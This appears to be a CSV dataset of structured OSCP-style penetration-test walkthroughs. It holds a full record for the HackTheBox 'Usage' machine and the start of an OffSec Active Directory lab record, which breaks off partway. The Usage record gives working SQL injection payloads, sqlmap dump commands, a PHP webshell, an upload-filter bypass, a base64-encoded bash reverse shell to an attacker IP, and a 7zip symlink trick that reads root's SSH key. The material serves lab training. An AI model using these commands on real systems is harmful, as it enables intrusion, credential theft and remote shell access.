"id","name","platform","machine_type","difficulty","os","os_version","ip_address","oscp_relevance","oscp_reasoning","exam_applicable","synopsis","total_duration_minutes","release_date","retire_date","writeup_author","writeup_date","tags","machine_author","points","attack_phases"
"htb-usage","Usage","HackTheBox","retired","easy","linux","Ubuntu 22.04.4 LTS","10.10.11.18","high","Demonstrates critical OSCP techniques: manual SQL injection discovery, automated sqlmap exploitation, file upload filter bypass, binary analysis with strings, and symlink privilege escalation via misconfigured sudo binary. Password reuse and cleartext credential discovery are also high-value OSCP skills.","True","Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system.","170","2024-04-13","2024-08-10","C4rm3l0","2024-08-07","SQL_INJECTION|BLIND_SQLI|SQLMAP|FILE_UPLOAD|FILTER_BYPASS|CVE-2023-24249|LARAVEL|PHP_WEBSHELL|RCE|PASSWORD_REUSE|CONFIG_FILES|BINARY_ANALYSIS|SYMLINK_ABUSE|7ZIP_EXPLOIT|LISTFILE_TECHNIQUE|SSH_KEY_THEFT|OSCP:HIGH|NGINX|UBUNTU|PRIVILEGE_ESCALATION|LATERAL_MOVEMENT","rajHere","20","[{""phase"": ""enumeration"", ""duration_minutes"": 15, ""description"": ""Initial port scanning reveals SSH and HTTP services. Web enumeration discovers two virtual hosts (usage.htb and admin.usage.htb). Both present login pages with different functionalities."", ""commands_used"": [{""command_id"": ""nmap-quick-scan"", ""context"": ""Initial TCP port discovery using fast scan with variable port assignment pattern"", ""step_number"": 1, ""command_executed"": ""ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.18 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)"", ""output_snippet"": ""22/tcp open\n80/tcp open"", ""success"": true, ""notes"": ""Common OSCP pattern: save open ports to variable for detailed scan. The port filtering with grep/cut/tr/sed is standard methodology.""}, {""command_id"": ""nmap-service-scan"", ""context"": ""Detailed service and version enumeration on discovered ports"", ""step_number"": 2, ""command_executed"": ""nmap -p$ports -sC -sV 10.10.11.18"", ""flags_used"": {""-sC"": ""Default NSE scripts for service enumeration"", ""-sV"": ""Version detection for accurate service identification""}, ""output_snippet"": ""22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://usage.htb/"", ""success"": true, ""notes"": ""Redirect to usage.htb reveals virtual host requirement""}, {""command_id"": ""hosts-file-add-entry"", ""context"": ""Add primary virtual host to resolve domain"", ""step_number"": 3, ""command_executed"": ""echo 10.10.11.18  usage.htb | sudo tee -a /etc/hosts"", ""success"": true}, {""command_id"": ""web-manual-enumeration"", ""context"": ""Manual browsing reveals admin panel link redirecting to admin.usage.htb subdomain"", ""step_number"": 4, ""url_visited"": ""http://usage.htb/"", ""findings"": [""Login page with email/password authentication"", ""Registration functionality available"", ""Password reset feature at /forget-password"", ""Admin panel link redirects to admin.usage.htb""], ""success"": true}, {""command_id"": ""hosts-file-add-entry"", ""context"": ""Add admin subdomain after discovery"", ""step_number"": 5, ""command_executed"": ""echo 10.10.11.18  admin.usage.htb | sudo tee -a /etc/hosts"", ""success"": true, ""screenshots"": [{""file"": ""images/page03_img02.png"", ""caption"": ""Browsing to the  admin   subdomain reveals yet another login page:"", ""extracted_from_page"": 3, ""confidence"": ""high"", ""context"": ""Matches: Browsing to the  admin   subdomain reveals yet another login page:""}]}, {""command_id"": ""user-registration-test"", ""context"": ""Register test account to explore authenticated functionality"", ""step_number"": 6, ""url_visited"": ""http://usage.htb/registration"", ""success"": true, ""notes"": ""Post-authentication shows limited blog page - not primary attack vector""}], ""failed_attempts"": [], ""key_findings"": [""Two virtual hosts: usage.htb (user portal) and admin.usage.htb (admin panel)"", ""OpenSSH 8.9p1 - no known exploits"", ""Nginx 1.18.0 - no known exploits"", ""Password reset functionality at /forget-password (potential injection point)"", ""Laravel framework detected (from later admin panel inspection)"", ""User registration available for initial access testing""], ""oscp_notes"": ""Standard OSCP enumeration flow: fast port scan \u2192 detailed service scan \u2192 virtual host discovery \u2192 manual web enumeration. The two-stage nmap pattern is efficient for exam time management. Virtual host enumeration is critical - always check for subdomains when redirects occur.""}, {""phase"": ""foothold"", ""duration_minutes"": 90, ""description"": ""SQL injection vulnerability discovered in password reset form allows dumping admin credentials. After cracking bcrypt hash, access admin panel running vulnerable Laravel-admin package (CVE-2023-24249). File upload filter bypassed to achieve PHP webshell upload and RCE as dash user."", ""vulnerabilities"": [{""name"": ""SQL Injection in Password Reset Form"", ""cve"": null, ""type"": ""boolean-based blind"", ""location"": ""/forget-password"", ""parameter"": ""email"", ""method"": ""POST"", ""severity"": ""high"", ""exploitability"": ""easy"", ""payload_example"": ""test' OR 1=1;-- -"", ""notes"": ""Standard boolean-based blind SQLi. Application returns different responses for valid vs invalid emails, enabling injection detection.""}, {""name"": ""Arbitrary File Upload in Laravel-admin"", ""cve"": ""CVE-2023-24249"", ""type"": ""filter bypass"", ""component"": ""encore/laravel-admin"", ""version"": ""1.8.18"", ""location"": ""/admin/auth/setting (avatar upload)"", ""severity"": ""critical"", ""exploitability"": ""medium"", ""technique"": ""Extension filter bypass via double extension (.jpg.php)"", ""notes"": ""Well-documented CVE with public PoCs available. Manual exploitation preferred for OSCP learning.""}], ""commands_used"": [{""command_id"": ""sqli-manual-test"", ""context"": ""Initial SQL injection detection using single quote in email parameter"", ""step_number"": 1, ""payload"": ""test' OR 1=1;-- -"", ""url"": ""http://usage.htb/forget-password"", ""success"": true, ""notes"": ""Application returned 'Password reset link sent' for malicious payload, confirming injection. This differs from invalid email response."", ""screenshots"": [{""file"": ""images/page04_img02.png"", ""caption"": ""Once registered, we log into the site using our email and password, landing us o..."", ""extracted_from_page"": 4, ""confidence"": ""high"", ""context"": ""Matches: Once registered, we log into the site using our email and password, landing us o""}]}, {""command_id"": ""burpsuite-intercept-request"", ""context"": ""Capture POST request for sqlmap automation"", ""step_number"": 2, ""request_saved"": ""reset.req"", ""success"": true, ""notes"": ""Saved full POST request including cookies (XSRF-TOKEN and laravel_session) required for authentication context""}, {""command_id"": ""sqlmap-from-request"", ""context"": ""Initial sqlmap scan with default settings"", ""step_number"": 3, ""command_executed"": ""sqlmap -r reset.req -p email --batch"", ""flags_used"": {""-r"": ""Read request from file"", ""-p"": ""Test specific parameter (email)"", ""--batch"": ""Never ask for user input, use default behavior""}, ""success"": false, ""error"": ""WARNING: POST parameter 'email' does not seem to be injectable\nCRITICAL: all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk'"", ""notes"": ""DEFAULT LEVEL INSUFFICIENT - this is critical OSCP learning point. Sqlmap suggestion to increase --level was key to success.""}, {""command_id"": ""sqlmap-from-request-level3"", ""context"": ""Retry sqlmap with increased test depth (--level 3)"", ""step_number"": 4, ""command_executed"": ""sqlmap -r reset.req -p email --batch --level 3"", ""flags_used"": {""--level"": ""3 (performs more extensive tests, required for blind SQLi detection)""}, ""success"": true, ""output_snippet"": ""[INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable\n[INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'"", ""vulnerability_confirmed"": {""type"": ""boolean-based blind"", ""title"": ""AND boolean-based blind - WHERE or HAVING clause (subquery - comment)"", ""payload_example"": ""_token=...&email=test' AND 2244=(SELECT (CASE WHEN (2244=2244) THEN 2244 ELSE (SELECT 5858 UNION SELECT 3175) END))-- cBAs""}, ""notes"": ""Success! --level 3 enables more thorough injection tests. OSCP LESSON: Trust manual verification over tool defaults.""}, {""command_id"": ""sqlmap-enumerate-databases"", ""context"": ""List all databases after confirming injection"", ""step_number"": 5, ""command_executed"": ""sqlmap -r reset.req -p email --batch --level 3 --dbs"", ""success"": true, ""output_snippet"": ""available databases [3]:\n[*] information_schema\n[*] performance_schema\n[*] usage_blog"", ""notes"": ""usage_blog is non-default database - primary target""}, {""command_id"": ""sqlmap-enumerate-tables"", ""context"": ""Enumerate tables in usage_blog database"", ""step_number"": 6, ""command_executed"": ""sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10"", ""flags_used"": {""-D"": ""Target database name"", ""--tables"": ""Enumerate tables"", ""--threads"": ""10 (parallel requests for faster enumeration)""}, ""success"": true, ""output_snippet"": ""Database: usage_blog\n[15 tables]\nadmin_users (TARGET)\npassword_reset_tokens\nusers\n..."", ""notes"": ""admin_users table is high-value target for credential extraction""}, {""command_id"": ""sqlmap-dump-table"", ""context"": ""Extract admin_users table contents"", ""step_number"": 7, ""command_executed"": ""sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump"", ""flags_used"": {""-T"": ""Target table name"", ""--dump"": ""Dump table contents""}, ""success"": true, ""credentials_obtained"": [{""id"": 1, ""username"": ""admin"", ""password_hash"": ""$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2"", ""hash_type"": ""bcrypt"", ""cost_factor"": 10}], ""notes"": ""Bcrypt hash extracted - proceed to offline cracking"", ""screenshots"": [{""file"": ""images/page10_img01.png"", ""caption"": ""entry to the admin panel."", ""extracted_from_page"": 10, ""confidence"": ""high"", ""context"": ""Matches: We navigate back to  admin.usage.htb   and authenticate with the credentials  ad""}]}, {""command_id"": ""john-crack-bcrypt"", ""context"": ""Crack bcrypt hash using john with rockyou wordlist"", ""step_number"": 8, ""command_executed"": ""john hash --wordlist=/usr/share/wordlists/rockyou.txt"", ""hash_file_content"": ""$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2"", ""success"": true, ""time_taken"": ""8 seconds"", ""password_cracked"": ""whatever1"", ""output_snippet"": ""whatever1        (?)\n1g 0:00:00:08 DONE (2024-08-07 05:56) 0.1123g/s 182.0p/s"", ""notes"": ""Weak password cracked quickly. OSCP TIP: Always try rockyou first before custom wordlists.""}, {""command_id"": ""web-login-admin-panel"", ""context"": ""Authenticate to admin panel with cracked credentials"", ""step_number"": 9, ""url"": ""http://admin.usage.htb/"", ""credentials_used"": ""admin:whatever1"", ""success"": true, ""notes"": ""Access granted to Laravel-admin dashboard""}, {""command_id"": ""web-version-enumeration"", ""context"": ""Enumerate software versions from admin dashboard"", ""step_number"": 10, ""location"": ""Dashboard \u2192 Environment section"", ""versions_found"": {""laravel"": ""10.18.0"", ""php"": ""8.1.2"", ""laravel-admin"": ""1.8.18 (vulnerable!)""}, ""success"": true, ""notes"": ""Laravel-admin 1.8.18 vulnerable to CVE-2023-24249 (arbitrary file upload)""}, {""command_id"": ""create-php-webshell"", ""context"": ""Create simple PHP command execution webshell"", ""step_number"": 11, ""command_executed"": ""echo '<?php system($_GET[\""melo\""]); ?>' > shell.php"", ""success"": true, ""notes"": ""GET parameter 'melo' used for command execution. Minimal webshell for initial RCE.""}, {""command_id"": ""file-rename-extension"", ""context"": ""Bypass upload filter by renaming to .jpg"", ""step_number"": 12, ""command_executed"": ""mv shell.php shell.jpg"", ""success"": true, ""notes"": ""Client-side filename check bypassed with image extension"", ""screenshots"": [{""file"": ""images/page13_img02.png"", ""caption"": ""mv  shell.php shell.jpg"", ""extracted_from_page"": 13, ""confidence"": ""high"", ""context"": ""Matches: mv  shell.php shell.jpg""}]}, {""command_id"": ""burpsuite-modify-upload"", ""context"": ""Intercept upload request and modify filename to double extension"", ""step_number"": 13, ""location"": ""/admin/auth/setting (avatar upload)"", ""original_filename"": ""shell.jpg"", ""modified_filename"": ""shell.jpg.php"", ""parameter_modified"": ""filename="", ""success"": true, ""notes"": ""CRITICAL: Server processes .php extension despite .jpg prefix. This is CVE-2023-24249 exploitation technique.""}, {""command_id"": ""web-access-uploaded-file"", ""context"": ""Access uploaded webshell directly via browser"", ""step_number"": 14, ""url"": ""http://admin.usage.htb/uploads/images/shell.jpg.php?melo=id"", ""command_tested"": ""id"", ""output"": ""uid=1000(dash) gid=1000(dash) groups=1000(dash)"", ""success"": true, ""notes"": ""RCE achieved as dash user! Webshell functional.""}, {""command_id"": ""revshells-payload-generate"", ""context"": ""Generate base64-encoded bash reverse shell payload"", ""step_number"": 15, ""shell_type"": ""Bash -i"", ""encoding"": ""Base64"", ""lhost"": ""10.10.14.30"", ""lport"": 4444, ""payload_generated"": ""sh -i >& /dev/tcp/10.10.14.30/4444 0>&1"", ""encoded_payload"": ""c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx"", ""success"": true, ""notes"": ""Base64 encoding avoids special character issues in web shells""}, {""command_id"": ""nc-listener"", ""context"": ""Start netcat listener for reverse shell callback"", ""step_number"": 16, ""command_executed"": ""nc -nlvp 4444"", ""port"": 4444, ""success"": true}, {""command_id"": ""webshell-execute-revshell"", ""context"": ""Trigger reverse shell via webshell"", ""step_number"": 17, ""url"": ""http://admin.usage.htb/uploads/images/shell.jpg.php?melo=echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx | base64 -d | bash"", ""success"": true, ""notes"": ""Browser automatically URL-encodes payload. Instant callback received.""}, {""command_id"": ""pty-spawn-script"", ""context"": ""Stabilize shell with PTY using script command"", ""step_number"": 18, ""command_executed"": ""script /dev/null -c bash"", ""success"": true, ""notes"": ""Interactive shell achieved. Can now use arrow keys, tab completion, etc.""}, {""command_id"": ""capture-user-flag"", ""context"": ""Retrieve user flag from dash home directory"", ""step_number"": 19, ""location"": ""/home/dash/user.txt"", ""success"": true}], ""failed_attempts"": [{""attempt"": ""sqlmap with default settings (no --level flag)"", ""command_executed"": ""sqlmap -r reset.req -p email --batch"", ""expected"": ""Detection of blind SQL injection"", ""actual"": ""WARNING: POST parameter 'email' does not seem to be injectable"", ""reason"": ""Default sqlmap test level (1) insufficient for detecting boolean-based blind SQLi in this application. Required --level 3 for deeper test payloads."", ""solution"": ""Increase test depth with --level 3 as suggested by sqlmap error message"", ""lesson_learned"": ""CRITICAL OSCP LESSON: Automated tools have limitations. Always trust manual verification (which confirmed SQLi) over tool defaults. Sqlmap --level flag is often required for blind injections. Read tool suggestions carefully."", ""time_wasted_minutes"": 15, ""documentation_importance"": ""high"", ""notes"": ""This is a common OSCP exam scenario: blind SQLi that requires increased sqlmap sensitivity. Document this pattern for future reference.""}, {""attempt"": ""Direct upload of shell.php without extension modification"", ""expected"": ""PHP file upload and execution"", ""actual"": ""Upload rejected with error: 'The avatar must be an image'"", ""reason"": ""Client-side or server-side file extension validation"", ""solution"": ""Rename to shell.jpg (bypass client-side check), intercept with Burp, modify to shell.jpg.php (bypass server-side check)"", ""lesson_learned"": ""File upload filters often check extensions at multiple stages. Multi-stage bypass required: client-side (rename to allowed extension) + server-side (double extension abuse)."", ""time_wasted_minutes"": 5, ""notes"": ""Standard file upload bypass technique. Always test double extensions (.jpg.php, .png.php) for PHP applications.""}], ""chains_applied"": [], ""key_findings"": [""SQL injection in password reset form (manual detection crucial)"", ""Admin credentials: admin:whatever1"", ""Laravel-admin 1.8.18 (CVE-2023-24249)"", ""File upload filter bypass via double extension"", ""Webshell upload path: /uploads/images/"", ""RCE achieved as dash user (uid=1000)""], ""oscp_notes"": ""This phase demonstrates complete OSCP web exploitation workflow: manual vulnerability discovery \u2192 automated tool usage (with proper flags!) \u2192 credential extraction \u2192 hash cracking \u2192 authenticated exploitation \u2192 RCE. Key lessons: (1) sqlmap --level 3 for blind SQLi, (2) CVE research for authenticated panels, (3) file upload bypass techniques, (4) webshell stability with PTY spawning. Time management: 90 minutes is realistic for exam (30 min SQLi + 30 min hash crack + 30 min file upload).""}, {""phase"": ""lateral_movement"", ""duration_minutes"": 20, ""description"": ""Enumeration of dash user's home directory reveals .monitrc configuration file containing plaintext password. Password reused for xander user account, enabling SSH access with more stable shell."", ""commands_used"": [{""command_id"": ""linux-enumerate-home-directory"", ""context"": ""List all files including hidden configs in dash home"", ""step_number"": 1, ""command_executed"": ""ls -al /home/dash"", ""success"": true, ""files_found"": ["".monitrc (INTERESTING)"", "".monit.id"", "".monit.pid"", "".monit.state"", "".bash_history -> /dev/null"", ""user.txt""], ""notes"": ""Hidden .monitrc file stands out - config files often contain credentials""}, {""command_id"": ""cat-read-file"", ""context"": ""Read monit configuration file"", ""step_number"": 2, ""command_executed"": ""cat /home/dash/.monitrc"", ""success"": true, ""credentials_found"": {""context"": ""monit web interface authentication"", ""username"": ""admin"", ""password"": ""3nc0d3d_pa$$w0rd"", ""service"": ""monit httpd (port 2812)""}, ""notes"": ""Plaintext password in config - test for reuse across users""}, {""command_id"": ""linux-enumerate-users"", ""context"": ""List system users to identify potential reuse targets"", ""step_number"": 3, ""command_executed"": ""ls -al /home"", ""users_found"": [""dash (current user)"", ""xander (potential target)""], ""success"": true}, {""command_id"": ""su-user-switch"", ""context"": ""Attempt password reuse for xander user"", ""step_number"": 4, ""command_executed"": ""su xander"", ""password_tried"": ""3nc0d3d_pa$$w0rd"", ""success"": true, ""output"": ""uid=1001(xander) gid=1001(xander) groups=1001(xander)"", ""notes"": ""PASSWORD REUSE SUCCESS! Classic OSCP pattern.""}, {""command_id"": ""ssh-connect-password"", ""context"": ""Establish stable SSH session as xander"", ""step_number"": 5, ""command_executed"": ""ssh xander@usage.htb"", ""password"": ""3nc0d3d_pa$$w0rd"", ""success"": true, ""notes"": ""More stable shell than reverse shell - preferred for privilege escalation enumeration""}], ""failed_attempts"": [], ""credentials_obtained"": [{""username"": ""xander"", ""password"": ""3nc0d3d_pa$$w0rd"", ""source"": ""/home/dash/.monitrc"", ""services"": [""SSH"", ""system login""]}], ""key_findings"": [""Monit monitoring service running as dash user (port 2812)"", ""Cleartext credentials in .monitrc configuration"", ""Password reuse vulnerability (monit password == xander system password)"", ""Two user accounts on system: dash and xander""], ""oscp_notes"": ""Classic OSCP lateral movement: config file enumeration \u2192 plaintext credential discovery \u2192 password reuse testing. ALWAYS check hidden files in home directories (.bash_history, .*, config files). Password reuse is extremely common in OSCP labs. Time estimate: 10-15 minutes for thorough home directory enumeration, 5 minutes for password testing.""}, {""phase"": ""privilege_escalation"", ""duration_minutes"": 45, ""description"": ""User xander can run custom /usr/bin/usage_management binary as root via sudo. Static analysis with strings reveals insecure 7zip command with -snl flag. Exploitation involves creating symlink to /root/.ssh/id_rsa and leveraging 7zip's @listfile feature to read arbitrary files despite symlink-as-link storage flag."", ""vulnerabilities"": [{""name"": ""7zip Symlink Arbitrary File Read via Listfile"", ""cve"": null, ""type"": ""symlink abuse"", ""component"": ""7zip (7za) version 16.02"", ""command_vulnerable"": ""/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *"", ""flag_exploited"": ""-snl (stores symlinks as links, not files)"", ""technique"": ""@filename listfile feature bypasses symlink protections"", ""severity"": ""high"", ""exploitability"": ""medium"", ""notes"": ""The -snl flag should prevent following symlinks, but @listfile feature reads symlink targets when used. Allows arbitrary file read as root when combined with sudo binary.""}], ""commands_used"": [{""command_id"": ""check-sudo-privs"", ""context"": ""Enumerate sudo privileges for xander user"", ""step_number"": 1, ""command_executed"": ""sudo -l"", ""success"": true, ""output_snippet"": ""User xander may run the following commands on usage:\n    (ALL : ALL) NOPASSWD: /usr/bin/usage_management"", ""notes"": ""Custom binary with NOPASSWD sudo - HIGH PRIORITY target for analysis""}, {""command_id"": ""file-identify-type"", ""context"": ""Identify binary type and properties"", ""step_number"": 2, ""command_executed"": ""file /usr/bin/usage_management"", ""success"": true, ""output"": ""ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped"", ""notes"": ""Not stripped = symbols present, easier to analyze. Dynamically linked = uses system libraries."", ""screenshots"": [{""file"": ""images/page10_img01.png"", ""caption"": ""entry to the admin panel."", ""extracted_from_page"": 10, ""confidence"": ""high"", ""context"": ""Matches: We navigate back to  admin.usage.htb   and authenticate with the credentials  ad""}]}, {""command_id"": ""binary-dynamic-analysis"", ""context"": ""Run binary to observe behavior"", ""step_number"": 3, ""command_executed"": ""sudo /usr/bin/usage_management"", ""success"": true, ""menu_options"": [""1. Project Backup (runs 7zip)"", ""2. Backup MySQL data (runs mysqldump)"", ""3. Reset admin password""], ""notes"": ""Option 1 triggers 7zip backup creation in /var/backups/project.zip""}, {""command_id"": ""strings-binary-analysis"", ""context"": ""Static analysis to reveal hardcoded commands"", ""step_number"": 4, ""command_executed"": ""strings /usr/bin/usage_management"", ""success"": true, ""commands_found"": [""chdir"", ""/var/www/html"", ""/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *"", ""/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql"", ""Error changing working directory to /var/www/html"", ""Password has been reset.""], ""critical_finding"": ""7zip command with -snl flag, wildcard *, and /var/www/html as working directory"", ""notes"": ""VULNERABILITY: chdir to /var/www/html + wildcard * + -snl flag = potential symlink abuse""}, {""command_id"": ""linux-check-directory-permissions"", ""context"": ""Verify write permissions on source directory"", ""step_number"": 5, ""command_executed"": ""ls -ld /var/www/html"", ""success"": true, ""output"": ""drwxrwxrwx 4 root xander 4096 Apr  3 12:39 /var/www/html/"", ""notes"": ""WRITABLE by xander! Can create files and symlinks in backup source directory.""}, {""command_id"": ""7zip-listfile-research"", ""context"": ""Research 7zip @listfile feature and -snl flag interaction"", ""step_number"": 6, ""research_source"": ""https://book.hacktricks.xyz/linux-hardening/privilege-escalation/7z-symlink-abuse"", ""technique_discovered"": ""Creating file @filename tells 7zip that filename is a listfile (contains list of files to compress). If filename is symlink to sensitive file, 7zip reads and displays symlink target content."", ""success"": true, ""notes"": ""Despite -snl (store symlink as link), @listfile feature reads symlink target content during processing""}, {""command_id"": ""cd-change-directory"", ""context"": ""Navigate to /var/www/html for exploitation"", ""step_number"": 7, ""command_executed"": ""cd /var/www/html"", ""success"": true}, {""command_id"": ""touch-file"", ""context"": ""Create @id_rsa listfile marker"", ""step_number"": 8, ""command_executed"": ""touch @id_rsa"", ""purpose"": ""Tell 7zip that id_rsa is a listfile (contains list of files)"", ""success"": true, ""notes"": ""@ prefix is special to 7zip - treats id_rsa as listfile instead of regular file""}, {""command_id"": ""ln-symbolic"", ""context"": ""Create symlink to root's SSH private key"", ""step_number"": 9, ""command_executed"": ""ln -s /root/.ssh/id_rsa id_rsa"", ""target"": ""/root/.ssh/id_rsa"", ""linkname"": ""id_rsa"", ""success"": true, ""notes"": ""Symlink points to target we want to read (root SSH key)""}, {""command_id"": ""sudo-execute-usage-management"", ""context"": ""Trigger 7zip backup with symlink exploitation"", ""step_number"": 10, ""command_executed"": ""sudo /usr/bin/usage_management"", ""option_selected"": ""1 (Project Backup)"", ""success"": true, ""output_snippet"": ""-----BEGIN OPENSSH PRIVATE KEY----- : No more files\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files\n...\n-----END OPENSSH PRIVATE KEY----- : No more files"", ""notes"": ""SUCCESS! 7zip output contains root SSH key content. The 'No more files' errors indicate 7zip tried to interpret key content as filenames (expected behavior).""}, {""command_id"": ""extract-ssh-key"", ""context"": ""Copy SSH key from 7zip output to local file"", ""step_number"": 11, ""key_extracted"": true, ""cleanup_required"": ""Remove ' : No more files' trailing text and spaces from each line"", ""success"": true, ""notes"": ""CRITICAL: Each line has trailing ': No more files' that must be removed for valid key format""}, {""command_id"": ""ssh-key-format"", ""context"": ""Format extracted key properly"", ""step_number"": 12, ""file_created"": ""root_id_rsa"", ""proper_format"": ""-----BEGIN OPENSSH PRIVATE KEY-----\n[base64 lines with no trailing spaces]\n-----END OPENSSH PRIVATE KEY-----"", ""success"": true}, {""command_id"": ""chmod-numeric-permissions"", ""context"": ""Set correct SSH key permissions"", ""step_number"": 13, ""command_executed"": ""chmod 600 root_id_rsa"", ""success"": true, ""notes"": ""SSH requires 600 permissions for private keys""}, {""command_id"": ""ssh-key-authentication"", ""context"": ""Authenticate as root using stolen SSH key"", ""step_number"": 14, ""command_executed"": ""ssh -i root_id_rsa root@usage.htb"", ""success"": true, ""output"": ""root@usage:~# id\nuid=0(root) gid=0(root) groups=0(root)"", ""notes"": ""ROOT ACCESS ACHIEVED!""}, {""command_id"": ""capture-root-flag"", ""context"": ""Retrieve root flag as proof of complete system compromise"", ""step_number"": 15, ""location"": ""/root/root.txt"", ""success"": true}], ""failed_attempts"": [], ""techniques"": [{""name"": ""7zip Listfile Symlink Arbitrary File Read"", ""category"": ""privilege_escalation"", ""difficulty"": ""medium"", ""steps"": [""Identify sudo binary using 7zip with writable source directory"", ""Research 7zip @listfile feature and -snl flag behavior"", ""Navigate to source directory (/var/www/html)"", ""Create @filename marker (e.g., touch @id_rsa)"", ""Create symlink to target file (ln -s /root/.ssh/id_rsa id_rsa)"", ""Execute sudo binary to trigger 7zip backup"", ""Extract file content from 7zip output (remove 'No more files' markers)"", ""Use extracted content (SSH key, /etc/shadow, etc.) for privilege escalation""], ""why_this_works"": ""7zip's @listfile feature treats files prefixed with @ as containing lists of files to compress. When @id_rsa exists, 7zip reads id_rsa as a listfile. Since id_rsa is a symlink, 7zip follows it and reads /root/.ssh/id_rsa content. The -snl flag (store symlinks as links) doesn't prevent listfile feature from reading symlink targets. 7zip then tries to interpret SSH key lines as filenames, fails with 'No more files' errors, but displays the content in output. This allows arbitrary file read as root when binary runs via sudo."", ""detection_difficulty"": ""medium"", ""references"": [""https://book.hacktricks.xyz/linux-hardening/privilege-escalation/7z-symlink-abuse"", ""7zip man page: -snl : store symbolic links as links""]}], ""key_findings"": [""Sudo permission: /usr/bin/usage_management (NOPASSWD)"", ""Binary uses 7zip with -snl flag and wildcard in writable directory"", ""/var/www/html writable by xander (rwxrwxrwx)"", ""7zip @listfile feature bypasses -snl symlink protection"", ""Root SSH private key successfully extracted"", ""Full root access achieved via SSH key authentication""], ""oscp_notes"": ""Advanced OSCP privilege escalation demonstrating binary analysis workflow: sudo -l \u2192 file type check \u2192 dynamic analysis (run binary) \u2192 static analysis (strings) \u2192 vulnerability research \u2192 exploitation. Key OSCP skills: (1) Binary analysis without reverse engineering tools, (2) Symlink abuse techniques, (3) Compression tool exploitation, (4) SSH key extraction and usage. Time estimate: 20-30 minutes for analysis, 15-20 minutes for research and exploitation. This is OSCP HARD mode - simpler privesc vectors usually available, but this teaches valuable methodology.""}]"
"oscp-labs-secura","Secura","OSCP_Labs","practice","medium","windows","Windows Server (Active Directory)","","high","Comprehensive 3-machine Active Directory chain demonstrating critical OSCP skills: credential extraction with Mimikatz, local vs domain authentication distinction, Chisel tunneling for localhost-bound services, MySQL credential harvesting, and GPO abuse for domain privilege escalation. Multi-machine pivoting and credential reuse patterns are highly exam-relevant.","True","Secura is a 3-machine Active Directory challenge lab demonstrating a complete enterprise attack chain. Initial access is gained through ManageEngine AppManager on SECURE (.95), where Mimikatz extracts credentials including a local account for ERA. The apache credential enables WinRM access to ERA (.96), but MySQL is bound to localhost only - requiring Chisel reverse tunneling to enumerate the database remotely. MySQL contains plaintext credentials for 'administrator' and 'charlotte'. Charlotte's credentials provide low-privilege access to DC01 (.97), where insecure GPO permissions allow adding charlotte to local Administrators via SharpGPOAbuse. Critical lesson: Windows tokens require session refresh after group membership changes.","180","","","C4rm3l0","2025-12-14","ACTIVE_DIRECTORY|WINDOWS|MULTI_MACHINE|CREDENTIAL_REUSE|MIMIKATZ|CHISEL|PORT_FORWARDING|MYSQL|MARIADB|GPO_ABUSE|SYSVOL|WINRM|LOCAL_AUTH|MANAGEENGINE|BLOODHOUND|SHARPHOUND|LATERAL_MOVEMENT|PRIVILEGE_ESCALATION|CREDENTIAL_MANAGER|OSCP:HIGH","OffSec","0","[{""phase"": ""enumeration"", ""duration_minutes"": 30, ""description"": ""Initial reconnaissance of all three machines reveals distinct attack surfaces: SECURE hosts ManageEngine AppManager (8443), ERA runs MariaDB (3306), and DC01 provides standard AD services. All machines have WinRM (5985) enabled for remote management."", ""targets"": [{""hostname"": ""SECURE"", ""ip"": ""192.168.179.95"", ""role"": ""App Server"", ""key_services"": [""ManageEngine AppManager (8443)"", ""WinRM (5985)"", ""RDP (3389)""]}, {""hostname"": ""ERA"", ""ip"": ""192.168.179.96"", ""role"": ""DB Server"", ""key_services"": [""MariaDB 10.3.24 (3306)"", ""WinRM (5985)""]}, {""hostname"": ""DC01"", ""ip"": ""192.168.179.97"", ""role"": ""Domain Controller"", ""key_services"": [""Kerberos (88)"", ""LDAP (389)"", ""SMB (445)"", ""WinRM (5985)""]}], ""commands_used"": [{""command_id"": ""nmap-quick-scan"", ""context"": ""Initial TCP port discovery across all three target machines"", ""step_number"": 1, ""command_executed"": ""nmap -p- --min-rate=1000 -T4 192.168.179.95-97"", ""success"": true, ""notes"": ""Scan all machines simultaneously for efficiency. Identified ManageEngine on .95 as primary attack vector.""}, {""command_id"": ""nmap-service-scan"", ""context"": ""Detailed service enumeration on discovered ports"", ""step_number"": 2, ""command_executed"": ""nmap -p8443,5985,3389 -sC -sV 192.168.179.95"", ""success"": true, ""notes"": ""ManageEngine AppManager identified - known CVE target""}], ""failed_attempts"": [], ""key_findings"": [""ManageEngine AppManager on SECURE:8443 - high-value exploitation target"", ""MariaDB 10.3.24 on ERA:3306 - potential credential storage"", ""All machines have WinRM enabled - enables PowerShell remoting with valid credentials"", ""DC01 is domain controller for secura.yzx domain""], ""oscp_notes"": ""Multi-machine enumeration strategy: scan all targets first to identify path of least resistance. ManageEngine products frequently have CVEs. WinRM on all machines suggests credential-based lateral movement will be key.""}, {""phase"": ""foothold"", 